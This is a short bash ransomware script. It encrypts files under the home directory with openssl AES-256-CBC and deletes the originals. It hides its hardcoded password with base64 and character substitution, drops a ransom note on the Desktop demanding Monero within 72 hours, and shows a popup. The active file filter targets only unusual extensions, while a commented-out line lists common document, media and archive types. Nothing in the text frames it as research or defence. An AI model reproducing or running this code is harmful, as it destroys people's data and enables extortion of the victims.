#!/bin/bash

# Generate a unique ID for the victim
VICTIM_ID=$(uuidgen)

# Obfuscate the password
PASSWORD=$(echo -n "g0tr00t3d" | base64 | tr 'A-Za-z0-9+/=' 'NOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' | rev)

# Encrypt files in the home directory
#find "$HOME" -type f \( -name "*.txt" -o -name "*.docx" -o -name "*.pdf" -o -name "*.jpg" -o -name "*.png" -o -name "*.xlsx" -o -name "*.pptx" -o -name "*.csv" -o -name "*.db" -o -name "*.sql" -o -name "*.json" -o -name "*.xml" -o -name "*.html" -o -name "*.htm" -o -name "*.md" -o -name "*.zip" -o -name "*.rar" -o -name "*.7z" -o -name "*.tar" -o -name "*.gz" -o -name "*.bz2" -o -name "*.mp3" -o -name "*.wav" -o -name "*.mp4" -o -name "*.avi" -o -name "*.mov" -o -name "*.mkv" \) | while read file; do
 find "$HOME" -type f \( -name "*.a1b" -o -name "*.a2b" -o -name "*.a3b" \) | while read file; do

    openssl enc -aes-256-cbc -salt -pass pass:$(echo -n "$PASSWORD" | tr 'NOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' 'A-Za-z0-9+/=' | rev | base64 --decode) -in "$file" -out "${file}.enc"
    rm "$file"
done

# Create a convincing ransom note with the unique ID
cat <<EOF > "$HOME/Desktop/RANSOM_NOTE.txt"
======================================================
YOUR FILES HAVE BEEN ENCRYPTED
======================================================

Your important files have been encrypted and are inaccessible. You have 72 hours to pay the ransom, after which the encryption key will be permanently deleted.

Your unique ID is: $VICTIM_ID

Send exactly 2.5 XMR to the following Monero address:
48t6fFfz69fZjhJT37f9F59Qf5J6TfFfz69fZjhJT37f9F59Qf5J6TfFfz69fZjhJT37f9F59Qf5J6TfFfz69fZjhJT37f9F59

Include your unique ID in the transaction message to ensure we can identify your payment.

Failure to pay will result in the permanent loss of your data. We guarantee that payment will result in the decryption of your files.

For any questions, contact us at support@evilusb.com with your unique ID.

Thank you for your cooperation.
======================================================
EOF


# Optional: Display a message box
zenity --info --text="Your files have been encrypted. Check your desktop for instructions. (RANSOM_NOTE.txt" --width=1000 --height=1000
